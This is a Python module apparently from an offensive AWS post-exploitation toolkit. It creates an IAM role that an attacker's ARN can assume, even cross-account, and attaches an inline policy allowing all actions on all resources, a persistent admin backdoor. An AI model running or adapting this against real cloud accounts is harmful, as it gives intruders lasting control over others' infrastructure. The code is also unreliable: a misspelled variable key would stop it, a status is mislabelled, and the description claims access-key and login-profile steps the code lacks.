import random, string

import flask_mongoengine
from termcolor import colored
from datetime import datetime
import json
from pydoc import pipepager

from core.database.models import AWSCredentials

author = {
    "name":"gl4ssesbo1",
    "twitter":"https://twitter.com/gl4ssesbo1",
    "github":"https://github.com/gl4ssesbo1",
    "blog":"https://www.pepperclipp.com/"
}

needs_creds = True

variables = {
    "SERVICE": {
        "value": "iam",
        "required": "true",
        "description": "The service that will be used to run the module. It cannot be changed."
    },
    "ROLE-NAME": {
        "value": "",
        "required": "false",
        "description": "The name of the role to create"
    },
    "EXTERNAL-ID": {
        "value": "",
        "required": "false",
        "description": "The External ID to put on the Assume Role Policy. If not set, a random one will be created."
    },
    "ATTACKER-ARN": {
        "value": "",
        "required": "true",
        "description": "The ARN of the attacker that will have access. It can also be cross account."
    },
    "POLICY-TO-ATTACH": {
        "value": '{"Version": "2012-10-17", "Statement": [{"Sid": "VisualEditor0", "Effect": "Allow", "Action": "*", "Resource": "*"}]}',
        "required": "true",
        "description": "The inline policy to add to the role"
    }
}
description = "This module will create an IAM role, Attach inline admin policy, Access Key and Login Profile if asked."

aws_command = ""

def exploit(profile, workspace):
    role = variables['ROLE-NAME']['value']
    externalID = variables['EXTERNAL-ID']['value']
    attackerARN = variables['ATTACKER-ARN']['value']
    policyDoc = variables['POLICY-TO-ATTCH']['value']

    if externalID == "":
        externalID = ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(15))

    if role == "":
        role = "admin-role-" + ''.join(random.choice(string.ascii_uppercase + string.digits) for _ in range(5))

    return_data = {
        "Role": role,
        "ExternalID": externalID,
        "AttackerARN": attackerARN
    }

    try:
        assumePolicy = {
            "Version": "2012-10-17",
            "Statement": [
                {
                    "Sid": "Statement1",
                    "Effect": "Allow",
                    "Principal": {
                        "AWS": [
                            attackerARN
                        ]
                    },
                    "Action": "sts:AssumeRole",
                    "Condition": {
                        "StringEquals": {
                            "sts:ExternalId": externalID
                        }
                    }
                }
            ]
        }

        profile.create_role(
            RoleName=role,
            AssumeRolePolicyDocument=json.dumps(assumePolicy)
        )
        return_data['RoleStatus'] = f"Role {role} Created"
    except Exception as e:
        return {"error": f"Error creating the role: {str(e)}"}

    try:
        profile.put_role_policy(
            RoleName=role,
            PolicyName="AdminPolicy",
            PolicyDocument=policyDoc
        )
        return_data['AdminPolicyStatus'] = f"AdminPolicy was added to the role"
    except Exception as e:
        return_data['AccessKeyStatus'] = f"Error adding admin policy to role: {str(e)}"

    return return_data